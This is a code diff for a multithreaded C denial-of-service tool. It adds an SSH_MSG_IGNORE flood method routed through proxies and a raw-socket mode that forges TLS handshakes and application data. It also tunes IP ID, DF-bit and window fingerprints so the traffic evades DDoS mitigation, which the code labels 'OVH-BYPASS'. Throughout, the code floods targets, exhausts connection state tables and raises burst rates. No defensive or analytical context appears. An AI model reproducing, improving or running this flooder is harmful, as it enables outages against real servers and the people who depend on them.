@@ -145,28 +145,37 @@ void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id
 
     if (ev->events & EPOLLIN) {
         
-        if ((args.is_v15_raw_amp || (args.is_hybrid_v15 && proxy_count > 0 && !conn->is_udp_assoc)) && conn->stage == STAGE_ATTACKING) {
+        if ((args.is_v15_raw_amp || args.is_vn_tcp || (args.is_hybrid_v15 && proxy_count > 0 && !conn->is_udp_assoc)) && conn->stage == STAGE_ATTACKING) {
             unsigned char drain[65536];
             int dr;
             while ((dr = recv(conn->fd, drain, sizeof(drain), MSG_DONTWAIT)) > 0) {}
             if (dr == 0) goto cleanup;
             if (dr < 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
-            int ret;
-            while (1) {
-                int s = 16384 + (fast_rand() % 16384);
-                int offset = fast_rand() % (BUFFER_POOL_SIZE - s);
-                ret = send(conn->fd, global_buffer_pool + offset, s, MSG_NOSIGNAL);
-                if (ret <= 0) {
-                    if (errno == EAGAIN || errno == EWOULDBLOCK) {
-                        conn->writable = 0;
+            if (args.is_vn_tcp) {
+                // vn: re-arm EPOLLOUT to keep sending
+                struct epoll_event ev2;
+                ev2.events = EPOLLIN | EPOLLOUT | EPOLLET;
+                ev2.data.ptr = conn;
+                epoll_ctl(epoll_fd, EPOLL_CTL_MOD, conn->fd, &ev2);
+                conn->writable = 1;
+            } else {
+                int ret;
+                while (1) {
+                    int s = 16384 + (fast_rand() % 16384);
+                    int offset = fast_rand() % (BUFFER_POOL_SIZE - s);
+                    ret = send(conn->fd, global_buffer_pool + offset, s, MSG_NOSIGNAL);
+                    if (ret <= 0) {
+                        if (errno == EAGAIN || errno == EWOULDBLOCK) {
+                            conn->writable = 0;
+                        }
+                        break;
                     }
-                    break;
+                    thread_stats[thread_id].packets++;
+                    thread_stats[thread_id].tcp_packets++;
+                    thread_stats[thread_id].bytes += ret;
                 }
-                thread_stats[thread_id].packets++;
-                thread_stats[thread_id].tcp_packets++;
-                thread_stats[thread_id].bytes += ret;
+                if (ret <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
             }
-            if (ret <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
             return;
         }
 
@@ -320,8 +329,8 @@ void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id
                 conn->client_udp_fd = ufd;
             }
             
-            if (args.is_v15_raw_amp || (args.is_hybrid_v15 && !conn->is_udp_assoc)) {
-                int sndbuf = 1048576;
+            if (args.is_v15_raw_amp || (args.is_hybrid_v15 && !conn->is_udp_assoc) || args.is_vn_tcp) {
+                int sndbuf = args.is_vn_tcp ? 4194304 : 1048576;
                 setsockopt(conn->fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
             }
             
@@ -842,36 +851,61 @@ void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id
                 }
             }
             
-            else if (args.is_v15_raw_amp) {
-                int cork = 1;
-                setsockopt(conn->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
-                int ret;
-                int batch_count = 0;
-                while (1) {
-                    int s = 32768 + (fast_rand() % 32768);
-                    int offset = fast_rand() % (BUFFER_POOL_SIZE - s);
-                    ret = send(conn->fd, global_buffer_pool + offset, s, MSG_NOSIGNAL | MSG_MORE);
-                    if (ret <= 0) {
-                        if (errno == EAGAIN || errno == EWOULDBLOCK) {
-                            conn->writable = 0;
-                        }
-                        break;
+            else if (args.is_v15_raw_amp || args.is_vn_tcp) {
+                if (args.is_vn_tcp && conn->sub_stage == 0) {
+                    // Step1: SSH banner
+                    const char *ssh_banner = "SSH-2.0-OpenSSH_9.3p1 Ubuntu-1ubuntu3\r\n";
+                    send(conn->fd, ssh_banner, strlen(ssh_banner), MSG_NOSIGNAL);
+                    // Step2: minimal KEXINIT
+                    unsigned char kexinit[256];
+                    memset(kexinit, 0, sizeof(kexinit));
+                    kexinit[0]=0x00;kexinit[1]=0x00;kexinit[2]=0x00;kexinit[3]=0xEC;
+                    kexinit[4]=0x08;kexinit[5]=0x14;
+                    for(int ki=6;ki<22;ki++) kexinit[ki]=(unsigned char)(fast_rand()&0xFF);
+                    kexinit[22]=0x00;kexinit[23]=0x00;kexinit[24]=0x00;kexinit[25]=0x1F;
+                    memcpy(kexinit+26,"curve25519-sha256,diffie-hellman-group14-sha256",31);
+                    send(conn->fd, kexinit, sizeof(kexinit), MSG_NOSIGNAL);
+                    conn->sub_stage = 1;
+                    conn->last_pulse_ms = now;
+                }
+                int ret = 0;
+                if (args.is_vn_tcp) {
+                    // SSH_MSG_IGNORE flood (RFC 4253 s11.2) - server MUST accept, no RST
+                    // Packet: [4B pkt_len][1B pad=6][1B type=2][4B str_len][32700B data][6B pad]
+                    #define VN_PL 32700
+                    #define VN_SZ (4+1+1+4+VN_PL+6)
+                    static __thread unsigned char vn_pkt[VN_SZ];
+                    static __thread int vn_ok = 0;
+                    if (!vn_ok) {
+                        uint32_t pl = 1+1+4+VN_PL+6;
+                        vn_pkt[0]=(pl>>24)&0xFF;vn_pkt[1]=(pl>>16)&0xFF;
+                        vn_pkt[2]=(pl>>8)&0xFF; vn_pkt[3]=pl&0xFF;
+                        vn_pkt[4]=6; vn_pkt[5]=2;
+                        vn_pkt[6]=(VN_PL>>24)&0xFF;vn_pkt[7]=(VN_PL>>16)&0xFF;
+                        vn_pkt[8]=(VN_PL>>8)&0xFF; vn_pkt[9]=VN_PL&0xFF;
+                        for(int pi=10;pi<VN_SZ;pi++) vn_pkt[pi]=(unsigned char)(fast_rand()&0xFF);
+                        vn_ok=1;
                     }
-                    thread_stats[thread_id].packets++;
-                    thread_stats[thread_id].tcp_packets++;
-                    thread_stats[thread_id].bytes += ret;
-                    batch_count++;
-                    if (batch_count >= 64) {
-                        cork = 0;
-                        setsockopt(conn->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
-                        cork = 1;
-                        setsockopt(conn->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
-                        batch_count = 0;
+                    *((unsigned int*)(vn_pkt+10))=fast_rand();
+                    while(1) {
+                        ret=send(conn->fd,vn_pkt,VN_SZ,MSG_NOSIGNAL);
+                        if(ret<=0){if(errno==EAGAIN||errno==EWOULDBLOCK)conn->writable=0;break;}
+                        thread_stats[thread_id].packets++;
+                        thread_stats[thread_id].tcp_packets++;
+                        thread_stats[thread_id].bytes+=ret;
+                    }
+                } else {
+                    while(1) {
+                        int s=32768+(fast_rand()%32768);
+                        int offset=fast_rand()%(BUFFER_POOL_SIZE-s);
+                        ret=send(conn->fd,global_buffer_pool+offset,s,MSG_NOSIGNAL);
+                        if(ret<=0){if(errno==EAGAIN||errno==EWOULDBLOCK)conn->writable=0;break;}
+                        thread_stats[thread_id].packets++;
+                        thread_stats[thread_id].tcp_packets++;
+                        thread_stats[thread_id].bytes+=ret;
                     }
                 }
-                cork = 0;
-                setsockopt(conn->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
-                if (ret <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
+                if(ret<=0 && errno!=EAGAIN && errno!=EWOULDBLOCK) goto cleanup;
             }
             
             else if (args.is_v7_pipe) {
@@ -955,7 +989,7 @@ cleanup:
         if (conn->proxy) {
             __sync_fetch_and_add(&conn->proxy->fail_count, 1);
             conn->proxy->last_fail_time = get_ms();
-            if (conn->proxy->fail_count >= 50000) {
+            if (conn->proxy->fail_count >= 15) {
                 conn->proxy->is_dead = 1;
             }
             if (conn->proxy->active_conns > 0) {
@@ -989,7 +1023,7 @@ static Proxy *select_alive_proxy() {
         int idx = rand() % proxy_count;
         Proxy *p = &proxies[idx];
         if (p->is_dead) {
-            if (now - p->last_fail_time > 60000) {
+            if (now - p->last_fail_time > 10000) {
                 p->is_dead = 0;
                 p->fail_count = 0;
             } else {
@@ -1025,8 +1059,8 @@ int spawn_connection(int epoll_fd, int thread_id) {
     int mss = 536 + (fast_rand() % 925);
     setsockopt(fd, IPPROTO_TCP, TCP_MAXSEG, &mss, sizeof(mss));
     
-    if (args.is_v15_raw_amp) {
-        int sndbuf = 1048576;
+    if (args.is_v15_raw_amp || args.is_vn_tcp) {
+        int sndbuf = args.is_vn_tcp ? 4194304 : 1048576;
         setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
     }
     
@@ -1034,7 +1068,11 @@ int spawn_connection(int epoll_fd, int thread_id) {
     addr.sin_family = AF_INET;
     Proxy *p = NULL;
     int is_udp = 0;
-    if (args.is_hybrid_v15 && proxy_count > 0) {
+    if (args.is_vn_tcp) {
+        // VN method: prefer proxy, fallback to direct connect
+        p = select_alive_proxy();
+        // p = NULL → will connect directly to target
+    } else if (args.is_hybrid_v15 && proxy_count > 0) {
         p = select_alive_proxy();
         if ((fast_rand() % 100) < 40) {
             is_udp = 1;
@@ -1043,7 +1081,7 @@ int spawn_connection(int epoll_fd, int thread_id) {
         p = select_alive_proxy();
     }
     
-    if (!p && proxy_count > 0 && (!args.is_v15_raw_amp) && (!args.is_hybrid_v15)) {
+    if (!p && proxy_count > 0 && (!args.is_v15_raw_amp) && (!args.is_hybrid_v15) && (!args.is_vn_tcp)) {
         close(fd);
         return 0;
     }
@@ -1518,11 +1556,11 @@ void *worker_thread(void *arg) {
         }
 
         // === CONSTANTS ===
-        #define V17B     2048
+        #define V17B     4096
         #define V17ETH   14
         #define V17IP    20
         #define V17TCP   20
-        #define V17PL   1440 // Payload tối đa (matching old code)
+        #define V17PL   1440 // Payload max
         #define V17FLEN (V17ETH+V17IP+V17TCP+V17PL)
         #define HUGE_PL_SIZE (1024 * 1024) // 1MB random payload buffer
 
@@ -1571,6 +1609,7 @@ void *worker_thread(void *arg) {
         unsigned char *slot_ch_sent=calloc(V17B,sizeof(unsigned char)); // ClientHello sent flag
         unsigned int  *slot_tsval=calloc(V17B,sizeof(unsigned int)); // TCP timestamp value per slot
         unsigned int  *slot_pl_sum=calloc(V17B,sizeof(unsigned int)); // Cached payload checksum
+        unsigned short *slot_ipid=calloc(V17B,sizeof(unsigned short)); // DWC: sequential IP ID per connection
 
         // Huge Payload Buffer for O(1) random data & DPI bypass
         unsigned char *huge_pl_buf = malloc(HUGE_PL_SIZE);
@@ -1603,7 +1642,7 @@ void *worker_thread(void *arg) {
             // IP
             struct iphdr *ih=(struct iphdr*)(fr+V17ETH);
             ih->ihl=5;ih->version=4;ih->tot_len=htons(V17IP+V17TCP+V17PL);
-            ih->frag_off=(fast_rand()%10<7)?htons(0x4000):0; // 70% DF set, 30% no DF (anti-fingerprint)
+            ih->frag_off=htons(0x4000); // DWC FIX: Always DF — modern OS never sends without DF
             ih->ttl=ttl_t[b%ttl_sz];
             ih->protocol=IPPROTO_TCP;
             ih->saddr=src_ip; ih->daddr=bin_target_ip;
@@ -1621,11 +1660,12 @@ void *worker_thread(void *arg) {
             slot_rn[b]=b;
             slot_ttl[b]=ttl_t[fast_rand()%ttl_sz]; // Fixed TTL per connection
             slot_win[b]=win_t[fast_rand()%win_sz]; // Fixed window per connection
-            unsigned char tls_v_choices[] = {0x01, 0x03, 0x03}; // TLS 1.0, 1.2, 1.2
-            slot_tls_ver[b]=tls_v_choices[fast_rand()%3]; // Fixed TLS version per connection
-            slot_ch_sent[b]=0; // ClientHello not yet sent
-            slot_tsval[b]=fast_rand(); // Initial timestamp value
+            unsigned char tls_v_choices[] = {0x01, 0x03, 0x03};
+            slot_tls_ver[b]=tls_v_choices[fast_rand()%3];
+            slot_ch_sent[b]=0;
+            slot_tsval[b]=fast_rand();
             slot_pl_sum[b]=0;
+            slot_ipid[b]=fast_rand()&0xFFFF; // Sequential IP ID, random start per connection
 
             th->source=htons(slot_sp[b]);
             th->dest=bin_target_port;
@@ -1634,7 +1674,7 @@ void *worker_thread(void *arg) {
             th->ack_seq=htonl(slot_ack[b]);
             th->window=htons(win_t[b%win_sz]);
 
-            // Build payload pointer (but don't copy yet, use L1 shared buffers)
+            // Build payload pointer
             unsigned char *pl=fr+V17ETH+V17IP+V17TCP;
 
             // Pre-compute TCP checksum base (exclude: sport, seq, ack, window, flags, len, payload)
@@ -1662,8 +1702,9 @@ void *worker_thread(void *arg) {
             vmsg[b].msg_hdr.msg_namelen=use_afp?sizeof(dst_sll):sizeof(raw_dst);
         }
 
-        LOG_INFO("T%d: v17 OVH-BYPASS iface=%s mode=%s batch=%d pkt=%d",
-                 tid,iface,use_afp?"AF_PACKET":"RAW",V17B,use_afp?V17FLEN:V17IP+V17TCP+V17PL);
+        LOG_INFO("T%d: %s iface=%s mode=%s batch=%d pkt=%d",
+                 tid, args.is_v18_tls ? "v18 TLS-BYPASS" : "v17 OVH-BYPASS",
+                 iface,use_afp?"AF_PACKET":"RAW",V17B,use_afp?V17FLEN:V17IP+V17TCP+V17PL);
         fflush(stdout); // force log output
 
         // === RECV + SYN BUFFERS on HEAP (avoid stack overflow with 8 threads) ===
@@ -1708,9 +1749,9 @@ void *worker_thread(void *arg) {
          th3->window=htons(65535);}
 
 
+
         unsigned int round=0;
         // Main attack loop
-
         while(1){
             round++;
             // === STATEFUL MODE: 3-Way Handshake ===
@@ -1904,28 +1945,122 @@ void *worker_thread(void *arg) {
 
                 unsigned int current_pl;
                 unsigned short flags;
-                unsigned int churn_threshold;
 
                 slot_rn[b]++;
 
-                // Connection recycling — fast for variety but long enough to push Gbps
-                // Dynamic churn rate to exhaust state table
-                churn_threshold = (args.port == 80 || args.port == 443) ? 
+                // === TLS ClientHello: send ONCE per connection after 3WHS ===
+                if (args.is_v18_tls && slot_st[b] == ST_ESTABLISHED && !slot_ch_sent[b]) {
+                    unsigned char ch_buf[512];
+                    memset(ch_buf, 0, sizeof(ch_buf));
+                    if(use_afp){memcpy(ch_buf,gw_mac,6);memcpy(ch_buf+6,src_mac,6);ch_buf[12]=8;ch_buf[13]=0;}
+                    
+                    // Build TLS 1.2 ClientHello payload
+                    unsigned char ch_payload[256];
+                    int cp = 0;
+                    ch_payload[cp++] = 0x16; // Handshake
+                    ch_payload[cp++] = 0x03; ch_payload[cp++] = 0x01; // TLS 1.0 compat
+                    int rec_len_pos = cp; cp += 2; // record length placeholder
+                    ch_payload[cp++] = 0x01; // ClientHello type
+                    int hs_len_pos = cp; cp += 3; // handshake length placeholder
+                    ch_payload[cp++] = 0x03; ch_payload[cp++] = 0x03; // TLS 1.2
+                    for(int i=0;i<32;i++) ch_payload[cp++] = fast_rand() & 0xFF; // Client Random
+                    ch_payload[cp++] = 32; // Session ID length
+                    for(int i=0;i<32;i++) ch_payload[cp++] = fast_rand() & 0xFF; // Session ID
+                    // Cipher Suites (Chrome-like)
+                    unsigned short ciphers[] = {0x1301,0x1302,0x1303,0xc02c,0xc02b,0xc030,0xc02f,0xcca9,0xcca8,0x00ff};
+                    int n_ciphers = sizeof(ciphers)/sizeof(ciphers[0]);
+                    ch_payload[cp++] = (n_ciphers*2) >> 8; ch_payload[cp++] = (n_ciphers*2) & 0xFF;
+                    for(int i=0;i<n_ciphers;i++){ch_payload[cp++]=ciphers[i]>>8;ch_payload[cp++]=ciphers[i]&0xFF;}
+                    ch_payload[cp++] = 1; ch_payload[cp++] = 0; // Compression: null
+                    // Extensions
+                    int ext_len_pos = cp; cp += 2;
+                    int ext_start = cp;
+                    // SNI extension
+                    ch_payload[cp++]=0x00;ch_payload[cp++]=0x00;
+                    char sni_host[32];
+                    int sni_len = snprintf(sni_host, sizeof(sni_host), "www.%x%x.com", fast_rand()&0xFFFF, fast_rand()&0xFFFF);
+                    int sni_ext_len = sni_len + 5;
+                    ch_payload[cp++]=(sni_ext_len)>>8;ch_payload[cp++]=(sni_ext_len)&0xFF;
+                    ch_payload[cp++]=(sni_ext_len-2)>>8;ch_payload[cp++]=(sni_ext_len-2)&0xFF;
+                    ch_payload[cp++]=0x00; // host_name type
+                    ch_payload[cp++]=sni_len>>8;ch_payload[cp++]=sni_len&0xFF;
+                    memcpy(ch_payload+cp, sni_host, sni_len); cp += sni_len;
+                    // supported_versions extension
+                    ch_payload[cp++]=0x00;ch_payload[cp++]=0x2b;
+                    ch_payload[cp++]=0x00;ch_payload[cp++]=0x05;
+                    ch_payload[cp++]=0x04;
+                    ch_payload[cp++]=0x03;ch_payload[cp++]=0x04; // TLS 1.3
+                    ch_payload[cp++]=0x03;ch_payload[cp++]=0x03; // TLS 1.2
+                    // Fill lengths
+                    int ext_total = cp - ext_start;
+                    ch_payload[ext_len_pos] = ext_total >> 8; ch_payload[ext_len_pos+1] = ext_total & 0xFF;
+                    int hs_len = cp - hs_len_pos - 3;
+                    ch_payload[hs_len_pos] = (hs_len >> 16) & 0xFF;
+                    ch_payload[hs_len_pos+1] = (hs_len >> 8) & 0xFF;
+                    ch_payload[hs_len_pos+2] = hs_len & 0xFF;
+                    int rec_len = cp - rec_len_pos - 2;
+                    ch_payload[rec_len_pos] = rec_len >> 8; ch_payload[rec_len_pos+1] = rec_len & 0xFF;
+                    
+                    // IP + TCP headers for ClientHello packet
+                    struct iphdr *cih=(struct iphdr*)(ch_buf+V17ETH);
+                    cih->ihl=5;cih->version=4;
+                    cih->tot_len=htons(V17IP+V17TCP+cp);
+                    cih->frag_off=htons(0x4000);cih->ttl=slot_ttl[b];cih->protocol=IPPROTO_TCP;
+                    cih->saddr=src_ip;cih->daddr=bin_target_ip;
+                    cih->id=htons(++slot_ipid[b]);
+                    
+                    struct tcphdr *cth=(struct tcphdr*)(ch_buf+V17ETH+V17IP);
+                    memset(cth,0,V17TCP);
+                    cth->source=htons(slot_sp[b]);cth->dest=bin_target_port;
+                    cth->seq=htonl(slot_seq[b]);cth->ack_seq=htonl(slot_ack[b]);
+                    cth->doff=5;cth->psh=1;cth->ack=1;
+                    cth->window=htons(slot_win[b]);
+                    // Copy ClientHello payload
+                    memcpy(ch_buf+V17ETH+V17IP+V17TCP, ch_payload, cp);
+                    
+                    // IP checksum
+                    cih->check=0;
+                    unsigned short *ciw=(unsigned short*)cih;
+                    unsigned int cic=0;
+                    for(int i=0;i<10;i++) cic+=ciw[i];
+                    cic=(cic>>16)+(cic&0xFFFF);cic+=(cic>>16);
+                    cih->check=(unsigned short)~cic;
+                    // TCP checksum
+                    cth->check=0;
+                    unsigned short *ctw=(unsigned short*)cth;
+                    unsigned int ccs=(src_ip&0xFFFF)+(src_ip>>16)+(bin_target_ip&0xFFFF)+(bin_target_ip>>16)+htons(IPPROTO_TCP)+htons(V17TCP+cp);
+                    for(int i=0;i<(V17TCP+cp)/2;i++) ccs+=ctw[i];
+                    if((V17TCP+cp)%2) ccs+=htons(((unsigned short)((unsigned char*)cth)[V17TCP+cp-1])<<8);
+                    ccs=(ccs>>16)+(ccs&0xFFFF);ccs+=(ccs>>16);
+                    cth->check=(unsigned short)~ccs;
+                    
+                    if(use_afp){
+                        sendto(fd_send,ch_buf,V17ETH+V17IP+V17TCP+cp,0,(struct sockaddr*)&dst_sll,sizeof(dst_sll));
+                    } else {
+                        sendto(fd_send,ch_buf+V17ETH,V17IP+V17TCP+cp,0,(struct sockaddr*)&raw_dst,sizeof(raw_dst));
+                    }
+                    slot_seq[b] += cp;
+                    slot_ch_sent[b] = 1;
+                    thread_stats[tid].packets++;
+                    thread_stats[tid].bytes += V17ETH+V17IP+V17TCP+cp;
+                }
+
+                // Connection recycling — fast for state table exhaustion
+                unsigned int churn_threshold = (args.port == 80 || args.port == 443) ? 
                                                 (5000 + (fast_rand() % 10000)) : (8000 + (fast_rand() % 15000));
                 
                 if(slot_rn[b] > churn_threshold) {
                     // Mix of RST and FIN/ACK for state exhaustion
                     if (fast_rand() % 2 == 0) {
-                        flags = (5<<12)|0x004; // doff=5, RST=1
+                        flags = (5<<12)|0x004; // RST
                         th->psh=0; th->ack=0; th->rst=1; th->fin=0; th->syn=0; th->urg=0;
                     } else {
-                        flags = (5<<12)|0x011; // doff=5, FIN=1, ACK=1
+                        flags = (5<<12)|0x011; // FIN+ACK
                         th->psh=0; th->ack=1; th->rst=0; th->fin=1; th->syn=0; th->urg=0;
                     }
-                    current_pl = 0; // RST/FIN has no payload
+                    current_pl = 0;
                     tw[6] = htons(flags);
                     
-                    // Update IP/TCP for teardown
                     unsigned int tot_tcp = V17TCP + current_pl;
                     unsigned int tot_ip = V17IP + tot_tcp;
                     ih->tot_len=htons(tot_ip);
@@ -1935,9 +2070,9 @@ void *worker_thread(void *arg) {
                     th->ack_seq=htonl(slot_ack[b]);
                     th->source=htons(slot_sp[b]);
                     
-                    // State bypass: Rapid IP ID and fragment variation on teardown
-                    ih->id=htons(fast_rand()&0xFFFF);
-                    ih->frag_off = (fast_rand() % 4 == 0) ? htons(0x4000) : 0; // 25% DF bit set
+                    // FIX: sequential IP ID + always DF
+                    ih->id=htons(++slot_ipid[b]);
+                    ih->frag_off=htons(0x4000);
                     ih->check=0;
                     unsigned short *iw2=(unsigned short*)ih;
                     unsigned int ic=iw2[0]+iw2[3]+htons((unsigned int)(ih->ttl<<8|IPPROTO_TCP))+iw2[6]+iw2[7]+iw2[8]+iw2[9];
@@ -1953,7 +2088,7 @@ void *worker_thread(void *arg) {
                     vmsg_active[valid_pkts] = vmsg[b];
                     valid_pkts++;
                     
-                    // Reset slot to SYN_SENT for new 3WHS — massive ephemeral port exhaustion
+                    // Reset slot for new connection
                     slot_st[b] = ST_SYN_SENT;
                     slot_rn[b] = 0;
                     slot_syn_sent[b] = 0;
@@ -1966,13 +2101,14 @@ void *worker_thread(void *arg) {
                     port_to_slot[p2] = b;
                     slot_ch_sent[b] = 0;
                     
-                    // Emulate completely different OS per new connection
+                    // New OS fingerprint per connection
                     slot_ttl[b] = ttl_t[fast_rand()%ttl_sz];
                     slot_win[b] = win_t[fast_rand()%win_sz];
+                    slot_ipid[b] = fast_rand() & 0xFFFF; // New sequential IP ID base
                     continue;
                 }
 
-                // Skip ClientHello, go straight to raw data
+                // Raw data blast
                 unsigned int pl_sum_ch = 0;
                 slot_ch_sent[b] = 1;
 
@@ -1986,18 +2122,71 @@ void *worker_thread(void *arg) {
                     th->psh=1; th->ack=1; th->rst=0; th->fin=0; th->syn=0; th->urg=0;
                 }
                 
-                    // 2. Micro-segmentation: Dynamic Payload Size (1000 to 1440)
+                    // 2. Dynamic Payload Size (1000 to 1440)
                     unsigned int raw_pl = 1000 + (fast_rand() % 440);
-                    if(raw_pl & 1) raw_pl++; // Keep even for checksum
+                    if(raw_pl & 1) raw_pl++;
                     current_pl = raw_pl;
                     tw[6] = htons(flags);
-                    
-                    // 3. High Entropy Payload & O(1) Checksum
+
                     unsigned char *pl = fr + V17ETH + V17IP + V17TCP;
-                    unsigned int pl_offset = (fast_rand() % (HUGE_PL_SIZE - current_pl)) & ~1;
-                    memcpy(pl, huge_pl_buf + pl_offset, current_pl);
-                    
-                    pl_sum_ch = huge_pl_sum[(pl_offset + current_pl) / 2] - huge_pl_sum[pl_offset / 2];
+
+                    if (args.is_v18_tls) {
+                        // === TLS Application Data Spoofing ===
+                        // Fill with random data from huge buffer first
+                        unsigned int pl_offset = (fast_rand() % (HUGE_PL_SIZE - current_pl)) & ~1;
+                        memcpy(pl, huge_pl_buf + pl_offset, current_pl);
+                        
+                        // Overwrite first 5 bytes with TLS Application Data record header
+                        pl[0] = 0x17; // Application Data
+                        pl[1] = 0x03;
+                        pl[2] = slot_tls_ver[b]; // Fixed TLS version per connection (0x01/0x03)
+                        pl[3] = (unsigned char)((current_pl - 5) >> 8);
+                        pl[4] = (unsigned char)((current_pl - 5) & 0xFF);
+                        
+                        // O(1) checksum: recompute only the 5-byte header diff
+                        unsigned int random_sum = huge_pl_sum[(pl_offset + current_pl) / 2] - huge_pl_sum[pl_offset / 2];
+                        // Subtract the original first 4 bytes (2 words), add the TLS header
+                        unsigned short orig_w0 = ((unsigned short*)(huge_pl_buf + pl_offset))[0];
+                        unsigned short orig_w1 = ((unsigned short*)(huge_pl_buf + pl_offset))[1];
+                        unsigned short new_w0 = ((unsigned short*)pl)[0]; // 0x17, 0x03
+                        unsigned short new_w1 = ((unsigned short*)pl)[1]; // tls_ver, len_hi
+                        // Word at offset 4 is only 1 byte (pl[4]) but paired with pl[5] which is unchanged from huge_buf
+                        // Since we copy huge_buf first then overwrite 5 bytes, pl[5] = huge_buf[pl_offset+5]
+                        unsigned short orig_w2 = ((unsigned short*)(huge_pl_buf + pl_offset))[2];
+                        unsigned short new_w2 = ((unsigned short*)pl)[2]; // pl[4], pl[5] — pl[4] is TLS len_lo
+                        pl_sum_ch = random_sum - orig_w0 - orig_w1 - orig_w2 + new_w0 + new_w1 + new_w2;
+                    } else {
+                        // === Original V17 Bypass Pattern Rotation + High Entropy Payload ===
+                        static const unsigned char v17_bp[10][14] = {
+                            {0xc0,0xaf,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
+                            {0xe0,0x80,0xaf,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
+                            {0xf0,0x80,0x80,0xaf,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
+                            {0xff,0xff,0xff,0xff,0x54,0x53,0x6f,0x75,0x72,0x63,0x65,0x00,0x00,0x00},
+                            {0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
+                            {0x17,0x00,0x03,0x2a,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
+                            {0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x67,0x65,0x74,0x73,0x00,0x00},
+                            {0x0d,0x0a,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
+                            {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
+                            {0xff,0xfe,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
+                        };
+                        static const int v17_bp_len[10] = {2,4,4,12,8,4,12,2,2,2};
+
+                        int bp_idx = (int)(fast_rand() % 10);
+                        int bp_len = v17_bp_len[bp_idx];
+
+                        memcpy(pl, v17_bp[bp_idx], bp_len);
+
+                        unsigned int random_len = current_pl - bp_len;
+                        unsigned int pl_offset = (fast_rand() % (HUGE_PL_SIZE - random_len)) & ~1;
+                        memcpy(pl + bp_len, huge_pl_buf + pl_offset, random_len);
+
+                        // O(1) checksum
+                        const unsigned short *bpw = (const unsigned short *)v17_bp[bp_idx];
+                        unsigned int pl_sum_bp = 0;
+                        for(int pi = 0; pi < bp_len/2; pi++) pl_sum_bp += bpw[pi];
+                        unsigned int random_sum = huge_pl_sum[(pl_offset + random_len) / 2] - huge_pl_sum[pl_offset / 2];
+                        pl_sum_ch = pl_sum_bp + random_sum;
+                    }
 
                 { // Common send path
                 unsigned int tot_tcp = V17TCP + current_pl;
@@ -2007,23 +2196,19 @@ void *worker_thread(void *arg) {
                 th->seq=htonl(slot_seq[b]);
                 th->ack_seq=htonl(slot_ack[b]);
                 th->source=htons(slot_sp[b]);
-                
-                // 4. TCP Window fixed per connection to match real OS
                 th->window=htons(slot_win[b]);
 
                 ih->tot_len=htons(tot_ip);
-                if(use_afp){
-                    viov[b].iov_len = V17ETH + tot_ip;
-                } else {
-                    viov[b].iov_len = tot_ip;
-                }
+                if(use_afp){ viov[b].iov_len = V17ETH + tot_ip; }
+                else { viov[b].iov_len = tot_ip; }
 
-                // Per-connection fixed TTL (like real OS)
                 ih->ttl = slot_ttl[b];
                 unsigned int newttlproto=(unsigned int)(ih->ttl<<8|IPPROTO_TCP);
                 unsigned short *iw2=(unsigned short*)ih;
                 
-                ih->id=htons(fast_rand()&0xFFFF);
+                // FIX: Sequential IP ID (not random) + always DF
+                ih->id=htons(++slot_ipid[b]);
+                ih->frag_off=htons(0x4000);
                 ih->check=0;
                 unsigned int ic=iw2[0]+iw2[3]+htons(newttlproto)+iw2[6]+iw2[7]+iw2[8]+iw2[9];
                 ic+=htons(tot_ip)+ih->id;
@@ -2040,7 +2225,7 @@ void *worker_thread(void *arg) {
 
                 vmsg_active[valid_pkts] = vmsg[b];
                 valid_pkts++;
-                } // end gh_send_common block
+                } // end common send block
             }
             
             if(valid_pkts == 0){
@@ -2057,7 +2242,7 @@ void *worker_thread(void *arg) {
             // 128x burst, dual socket, skip checksum between bursts
             int cur_fd = fd_send;
             unsigned long long total_sent = 0, total_bytes = 0;
-            for(int burst = 0; burst < 128; burst++) {
+            for(int burst = 0; burst < 256; burst++) {
                 int sent=sendmmsg(cur_fd,vmsg_active,valid_pkts,0);
                 if(sent>0){
                     total_sent += sent;
@@ -2122,7 +2307,10 @@ void *worker_thread(void *arg) {
         free(vbuf);free(vmsg);free(viov);free(tcp_base);free(ip_base);
 
         free(slot_seq);free(slot_ack);free(slot_sp);free(slot_st);free(slot_rn);
-        free(slot_ttl);free(slot_win);
+        free(slot_ttl);free(slot_win);free(slot_syn_sent);
+        free(slot_tls_ver);free(slot_ch_sent);free(slot_tsval);
+        free(slot_pl_sum);free(slot_ipid);
+        free(huge_pl_buf);free(huge_pl_sum);free(port_to_slot);
         free(recv_buf);free(syn_buf);free(ack_buf);
         close(fd_send);close(fd_send2);close(fd_recv);
         return NULL;
@@ -2167,7 +2355,7 @@ void *worker_thread(void *arg) {
                     if (curr->proxy) {
                         __sync_fetch_and_add(&curr->proxy->fail_count, 1);
                         curr->proxy->last_fail_time = now;
-                        if (curr->proxy->fail_count >= 50000) {
+                        if (curr->proxy->fail_count >= 15) {
                             curr->proxy->is_dead = 1;
                         }
                         if (curr->proxy->active_conns > 0) { __sync_fetch_and_sub(&curr->proxy->active_conns, 1); __sync_fetch_and_sub(&global_proxy_active_conns, 1); }
